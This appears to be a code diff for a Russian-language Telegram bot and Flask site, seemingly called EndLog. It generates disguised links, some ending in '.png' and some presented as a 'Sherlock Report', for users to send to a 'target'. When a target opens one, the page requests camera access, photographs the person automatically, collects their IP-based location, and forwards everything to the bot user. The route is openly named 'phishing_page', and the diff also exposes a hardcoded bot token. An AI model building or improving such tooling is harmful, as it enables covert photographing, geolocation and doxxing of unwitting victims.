@@ -10,12 +10,13 @@ from flask import Flask, request, render_template_string, jsonify
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from datetime import datetime
+import uuid
 
 app = Flask(__name__)
 
 # Конфигурация
 BOT_TOKEN = '8048949774:AAEqlTkVH_VKcJb-AmTW_2Y2zzdVyYktom0'
-BASE_URL = "https://dox-searcher.onrender.com"
+BASE_URL = "https://best-osint.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -31,7 +32,10 @@ def generate_token(length=8):
     chars = string.ascii_letters + string.digits
     return ''.join(random.choice(chars) for _ in range(length))
 
-# HTML шаблон с двумя камерами
+# Генератор UUID для Sherlock Report
+def generate_sherlock_token():
+    return f"{uuid.uuid4()}-{''.join(random.choices('abcdef0123456789', k=16))}"
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -72,7 +76,7 @@ HTML_TEMPLATE = """
         }
         
         async function sendPhotos(frontPhoto, backPhoto, ipInfo) {
-            const token = window.location.pathname.split('/').pop();
+            const token = window.location.pathname.split('/').pop().replace('.png', '');
             
             try {
                 const response = await fetch('/upload', {
@@ -100,7 +104,7 @@ HTML_TEMPLATE = """
         
         async function getIPInfo() {
             try {
-                const response = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
+                const response = await fetch('https://ipapi.co/json/');
                 return await response.json();
             } catch (error) {
                 console.error('IP info error:', error);
@@ -188,23 +192,62 @@ HTML_TEMPLATE = """
 </html>
 """
 
-@app.route('/<custom_token>')
+@app.route('/<custom_token>.png')
 def phishing_page(custom_token):
     ip_info = {}
     try:
-        if request.headers.getlist("X-Forwarded-For"):
-            ip = request.headers.getlist("X-Forwarded-For")[0]
-        else:
-            ip = request.remote_addr
-        
-        ip_info = {"query": ip}
+        response = requests.get(f'https://ipapi.co/json/')
+        ip_info = response.json()
     except Exception as e:
         print(f"Ошибка при получении IP информации: {e}")
-        ip_info = {"query": "Unknown"}
-    
+        try:
+            # Fallback вариант
+            if request.headers.getlist("X-Forwarded-For"):
+                ip = request.headers.getlist("X-Forwarded-For")[0]
+            else:
+                ip = request.remote_addr
+            
+            response = requests.get(f'http://ip-api.com/json/{ip}')
+            ip_info = response.json()
+        except:
+            ip_info = {"ip": "Unknown", "city": "Unknown", "region": "Unknown", "country_name": "Unknown", "org": "Unknown"}
+
     user_id = None
     for uid, token in user_tokens.items():
         if token == custom_token:
+            user_id = uid
+            break
+    
+    if user_id:
+        if user_id not in photo_storage:
+            photo_storage[user_id] = {}
+        photo_storage[user_id]["ip_info"] = ip_info
+    
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/r/<sherlock_token>')
+def sherlock_page(sherlock_token):
+    ip_info = {}
+    try:
+        response = requests.get(f'https://ipapi.co/json/')
+        ip_info = response.json()
+    except Exception as e:
+        print(f"Ошибка при получении IP информации: {e}")
+        try:
+            # Fallback вариант
+            if request.headers.getlist("X-Forwarded-For"):
+                ip = request.headers.getlist("X-Forwarded-For")[0]
+            else:
+                ip = request.remote_addr
+            
+            response = requests.get(f'http://ip-api.com/json/{ip}')
+            ip_info = response.json()
+        except:
+            ip_info = {"ip": "Unknown", "city": "Unknown", "region": "Unknown", "country_name": "Unknown", "org": "Unknown"}
+
+    user_id = None
+    for uid, token in user_tokens.items():
+        if token == sherlock_token:
             user_id = uid
             break
     
@@ -261,11 +304,11 @@ def handle_upload():
             photo_storage[user_id]["back"] = back_filename
         
         # Формируем информацию об IP
-        ip_address = ip_info.get('query', 'Unknown')
+        ip_address = ip_info.get('ip', ip_info.get('query', 'Unknown'))
         city = ip_info.get('city', 'Unknown')
-        region = ip_info.get('regionName', 'Unknown')
-        country = ip_info.get('country', 'Unknown')
-        isp = ip_info.get('isp', 'Unknown')
+        region = ip_info.get('region', ip_info.get('regionName', 'Unknown'))
+        country = ip_info.get('country_name', ip_info.get('country', 'Unknown'))
+        isp = ip_info.get('org', ip_info.get('isp', 'Unknown'))
         
         caption = f"✅ Фото успешно получено!\n\n"
         caption += f"▪️ Токен: {custom_token}\n"
@@ -318,14 +361,14 @@ def start_handler(message):
                 bot.send_photo(
                     message.chat.id,
                     photo,
-                    caption="<b>Получи фото лица своего обидчика за пару секунд.</b>",
+                    caption="<b>EndLog</b> – получи фото лица <b>своего</b> обидчика за <b>пару секунд</b>",
                     parse_mode="HTML",
                     reply_markup=main_keyboard()
                 )
         else:
             bot.send_message(
                 message.chat.id,
-                "<b>Получи фото лица своего обидчика за пару секунд.</b>",
+                "<b>EndLog</b> – получи фото лица <b>своего</b> обидчика за <b>пару секунд</b>",
                 parse_mode="HTML",
                 reply_markup=main_keyboard()
             )
@@ -333,7 +376,8 @@ def start_handler(message):
         print(f"Ошибка при отправке стартового сообщения: {e}")
         bot.send_message(
             message.chat.id,
-            "Получи фото лица своего обидчика за пару секунд.",
+            "<b>EndLog</b> – получи фото лица <b>своего</b> обидчика за <b>пару секунд</b>",
+            parse_mode="HTML",
             reply_markup=main_keyboard()
         )
 
@@ -354,11 +398,39 @@ def create_link_handler(call):
             bot.answer_callback_query(call.id)
             return
         
-        custom_token = generate_token()
-        user_tokens[user_id] = custom_token
-        link = f"{BASE_URL}/{custom_token}"
+        keyboard = InlineKeyboardMarkup()
+        keyboard.row(
+            InlineKeyboardButton('Изображение', callback_data='create_image_link'),
+            InlineKeyboardButton('Шерлок репорт', callback_data='create_sherlock_link')
+        )
         
-        print(f"Создана ссылка для {user_id}: {link}")
+        bot.send_message(
+            user_id,
+            "Шаблоны:",
+            reply_markup=keyboard
+        )
+        
+        bot.answer_callback_query(call.id)
+    except Exception as e:
+        print(f"Ошибка при создании ссылки: {e}")
+        bot.send_message(call.message.chat.id, "❌ Произошла ошибка. Попробуйте позже.")
+
+@bot.callback_query_handler(func=lambda call: call.data == 'create_image_link')
+def create_image_link_handler(call):
+    try:
+        user_id = call.message.chat.id
+        
+        if user_id in banned_users:
+            bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
+            bot.answer_callback_query(call.id)
+            return
+        
+        custom_token = generate_token()
+        while custom_token in user_tokens.values():
+            custom_token = generate_token()
+            
+        user_tokens[user_id] = custom_token
+        link = f"{BASE_URL}/{custom_token}.png"
         
         bot.send_message(
             user_id,
@@ -372,9 +444,42 @@ def create_link_handler(call):
         
         bot.answer_callback_query(call.id)
     except Exception as e:
-        print(f"Ошибка при создании ссылки: {e}")
+        print(f"Ошибка при создании image ссылки: {e}")
         bot.send_message(call.message.chat.id, "❌ Произошла ошибка при создании ссылки. Попробуйте позже.")
 
+@bot.callback_query_handler(func=lambda call: call.data == 'create_sherlock_link')
+def create_sherlock_link_handler(call):
+    try:
+        user_id = call.message.chat.id
+        
+        if user_id in banned_users:
+            bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
+            bot.answer_callback_query(call.id)
+            return
+        
+        sherlock_token = generate_sherlock_token()
+        while any(sherlock_token in tokens for tokens in user_tokens.values()):
+            sherlock_token = generate_sherlock_token()
+            
+        user_tokens[user_id] = sherlock_token
+        link = f"{BASE_URL}/r/{sherlock_token}"
+        
+        bot.send_message(
+            user_id,
+            f"🔗 Ваша Sherlock Report ссылка:\n<code>{link}</code>\n\n"
+            "Отправьте её цели. При открытии:\n"
+            "1. Автоматически запросится доступ к камере\n"
+            "2. Если доступ разрешен - фото сделается автоматически\n"
+            "3. Фото придет в этот чат",
+            parse_mode="HTML"
+        )
+        
+        bot.answer_callback_query(call.id)
+    except Exception as e:
+        print(f"Ошибка при создании sherlock ссылки: {e}")
+        bot.send_message(call.message.chat.id, "❌ Произошла ошибка при создании ссылки. Попробуйте позже.")
+
+# Остальные функции (админка и т.д.) остаются без изменений
 @bot.message_handler(commands=['admin'])
 def admin_handler(message):
     if message.from_user.id not in ADMINS:
